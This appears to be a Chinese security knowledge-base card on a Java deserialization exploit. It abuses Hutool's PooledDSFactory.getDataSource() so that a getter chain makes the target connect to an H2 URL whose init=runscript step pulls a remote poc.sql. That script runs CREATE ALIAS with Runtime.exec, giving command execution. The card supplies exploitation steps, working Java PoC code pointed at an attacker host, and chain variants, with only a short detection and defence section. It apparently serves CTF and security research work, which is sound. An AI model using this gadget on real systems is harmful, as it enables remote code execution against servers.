---
id: web-java-deser-hutool-pooleddsfactory-getdatasource-h2-runscript
title: Hutool PooledDSFactory.getDataSource 当反序列化里的"任意 getter → JDBC 连接" sink：getter 被 Jackson/POJONode 触发即连 H2，init=runscript from 远程 SQL 落地命令执行
type: scenario
domain: web
path: web/java/deserialization
technique: hutool-getdatasource-h2-init-runscript-gadget
aliases:
- PooledDSFactory getDataSource sink
- Hutool 任意 getter JDBC sink
- H2 init=runscript from
- setting.set(url) 反序列化
- initialSize 提前建连
tags:
- java
- deserialization
- gadget
- hutool
- h2
- jdbc
- getter
- rce
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: hutool-all 5.8.16（原文依赖版本；漏洞面是该类的 getter 行为而非某个已修复 CVE）
verification:
  verified_by: verifier-T2-3W4B
  verified_at: '2026-11-08T22:04:12+08:00'
  notes: 已对照原文核对（本次核对未读取图片，仅依据正文贴出的 hutool 依赖、poc.sql、Setting/url 构造与调用栈文本）：hutool-all 5.8.16、jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'、PooledDSFactory+Setting、initialSize=1 让 getDataSource 阶段即建连、Unsafe.allocateInstance 跳过无参构造（否则 createDbSetting 读配置抛异常）、以及「选 getDataSource 而不是 DriverManager.getConnection 是因为后者没有可被 getter 触发的实例方法」这些要点均与原文一致，属原文明确给出且可复用的 sink。核对时修正两处：①原文只说 PooledDSFactory 建连接池、未提 Druid，原来卡内写「建立 DruidDataSource」属臆断，已改为 hutool 自带 PooledDataSource；②触发条件里原写「目标 JDK 未禁用 init/runscript」，该能力与 JDK 无关，已改为「目标所用 H2 未通过 URL 白名单/-ifNotExists 禁用」。affected_versions 按原文依赖记 hutool-all 5.8.16（原文明确版本），保留未改。dedup：与 web-java-deserialization-h2-jdbc-init-create-alias-rce（0.175，commons-beanutils BeanComparator+PriorityQueue 调 JdbcDataSource.getConnection）差异成立——触发源与 sink 类均不同；与同篇 jooq 卡（0.139）分属不同 sink。未验证点：未复现，未实际起 H2 拉 poc.sql；能否出网为环境前提，已列入触发条件。本次核对未读取图片。
---

## 一句话结论

`cn.hutool.db.ds.pooled.PooledDSFactory` 的 `getDataSource()` 会用内部 `Setting` 里的 `url` 去建连接池，而 H2 的 JDBC URL 支持 `init=runscript from 'http://.../poc.sql'`；因此只要反序列化链能触发"任意对象的任意 getter"，塞一个 `PooledDSFactory` 进去就能让服务端主动连上攻击者的 H2 URL 并执行远端 SQL 里的 `CREATE ALIAS ... AS $$ ... $$` + `CALL`，落地为命令执行 —— 不需要 `Class.forName` 显式加载驱动，也不需要应用本身有 JDBC 注入点。

## 原理

- Hutool 的 `PooledDSFactory` 继承 `AbstractDSFactory`，`getDataSource()` 在首次调用时按 `Setting` 里的 `url`/`driver`/`initialSize` 建立 `PooledDataSource`（`cn.hutool.db.ds.pooled` 自带的连接池实现）；这个方法是 public 的 getter 形态（`getXxx`），因此会被 Jackson 的 Bean 序列化、`POJONode.toString()`、各类"任意 getter"链自动调用。
- H2 的连接串里 `init=` 参数会在连接建立后执行指定 SQL；`runscript from '<url>'` 支持 HTTP 地址，等于让目标 JVM 去拉取攻击者的脚本并执行。
- SQL 侧不需要 Java 代码执行能力：H2 允许 `CREATE ALIAS ... AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }'` 这类内嵌 Java 源码的别名，再 `CALL EXEC('cmd')` 即命令执行。这是 H2 的合法功能，不涉及反序列化黑名单。
- 为什么用 `PooledDSFactory` 而不是原生 `DriverManager.getConnection`：原生写法没有"可被 getter 触发的实例方法"，而 `getDataSource()` 恰好是实例方法、返回值即建连动作，天然嵌入 getter 链。
- 两个构造细节：
  - 若想让 `getDataSource()` 阶段就真正建连（而不是等到 `getConnection()`），给 `Setting` 加 `initialSize=1`；
  - 若整条链要求对象可被序列化，用 `Unsafe.allocateInstance(PooledDSFactory.class)` 跳过构造函数（构造函数会去读配置文件，无配置就抛异常），再用反射把 `setting`/`dsMap` 字段直接写进去。

## 触发条件

- 目标应用存在原生反序列化入口（或 Jackson 多态/`POJONode` 这类能触发 getter 的入口），classpath 里有 hutool（`cn.hutool.db`）。
- 目标能出网访问攻击者的 HTTP 服务（H2 去拉 `poc.sql`）；不能出网时改用本地文件路径或改打其他 sink。
- 目标所用 H2 未通过 URL 白名单/`-ifNotExists` 等策略禁用 `init`/`runscript`（这套能力在 H2 上默认开启，不受 JDK 版本限制）。
- 反序列化黑名单未覆盖 `cn.hutool.db.ds.pooled.PooledDSFactory`（多数黑名单只封 CC/CB/JDK 链）。

## 利用步骤

1. 在攻击者机器上准备 `poc.sql`：`CREATE ALIAS EXEC AS '...Runtime.getRuntime().exec(cmd)...'; CALL EXEC('calc')`，用 HTTP 服务暴露。
2. 构造 `Setting`：`url = "jdbc:h2:mem:test;init=runscript from 'http://attacker:7777/poc.sql'"`，可选 `initialSize=1`。
3. 实例化 `PooledDSFactory`（正常构造或 `Unsafe.allocateInstance` + 反射填 `setting`），得到"被序列化的对象图"。
4. 用 `POJONode`（Jackson）包住它，外面再套一个能在反序列化时自动 `toString`/取 getter 的触发器；若走 Jackson 侧，直接 `POJONode.toString()` 就会进入 Bean 序列化并调用 `getDataSource()`。
5. 把 payload 发给目标；目标 JVM 拉取 `poc.sql` 并执行 `CALL EXEC`，命令落地。
6. 无回显时改用写文件/出网反连；确认链路可用后可按需替换 `poc.sql` 里的命令。

## PoC

```java
// 1) 攻击者 SQL（H2 语法，内嵌 Java 源码创建别名）
// CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException
//   {Runtime.getRuntime().exec(cmd);return "ok";}';
// CALL EXEC ('calc')

// 2) 构造 sink 对象
String url = "jdbc:h2:mem:test;init=runscript from 'http://127.0.0.1:7777/poc.sql'";
Setting setting = new Setting();
setting.set("url", url);
setting.put("initialSize", "1");                 // 让 getDataSource() 阶段就建连
PooledDSFactory factory = new PooledDSFactory(setting);

// 3) 交给 getter 触发链：Jackson POJONode 序列化时会取 getter
POJONode node = new POJONode(factory);
node.toString();                                 // 触发 getDataSource() -> 建连 -> 执行 init 脚本
```

```java
// 若目标链要求对象可序列化：跳过构造函数（避免读配置文件抛异常）再反射填字段
Unsafe unsafe = (Unsafe) ReflectUtil.getFieldValue(null, ReflectUtil.getField(Unsafe.class, "theUnsafe"));
PooledDSFactory f = (PooledDSFactory) unsafe.allocateInstance(PooledDSFactory.class);
Setting s = new Setting();
s.set("url", "jdbc:h2:mem:test;init=runscript from 'http://attacker/poc.sql'");
ReflectUtil.setFieldValue(f, "setting", s);
ReflectUtil.setFieldValue(f, "dsMap", new HashMap<>());
f.getDataSource().getConnection();
```

## 变体与关联

- sink 换形：`PooledDSFactory.getDataSource()`、`DSFactory.getDataSource()`、任何"public getter 里带 URL 建连"的组件；H2 之外还有 `derby`/`clickhouse`/`postgres` 的 JDBC URL 参数注入。
- 触发源换形：`EventListenerList.readObject → UndoManager.toString → Vector.toString`、`HashMap` 冲突键触发 `toString`、Jackson 多态 `POJONode`。
- 构造变体：不写 `initialSize` 则延迟到 `getConnection()`；用 `writeMapBegin` 手写 Hessian 流可避免序列化时提前触发 `put` 导致 value 丢失。
- 与 SQL 注入类 H2 RCE 卡的区别：那条要求应用存在可控 JDBC URL / SQL 拼接点；本卡是**反序列化 gadget**，应用没有任何 JDBC 注入面也能打通。
- 边界：黑名单若按包名前缀封 hutool，需要换 sink；目标不出网时 `runscript from` 的 http 分支失效，可改 `file:` 读本地已有 SQL。

## 检测与防御

- 检测：出站 HTTP 请求指向随机端口且路径以 `.sql` 结尾；JVM 进程内出现 H2 `CREATE ALIAS`/`RUNSCRIPT` 相关 SQL；反序列化入口的类解析日志出现 `cn.hutool.db.*`。
- 防御：反序列化白名单化（不要只黑名单 CC/CB），把 hutool 的 `db` 包纳入禁用；升级 hutool 并移除不必要的 JDBC 连接池暴露；H2 生产环境加 `-ifNotExists`/禁用 `INIT`、`RUNSCRIPT`（或用 `FORBID_CREATION`、URL 白名单）；限制应用出网。
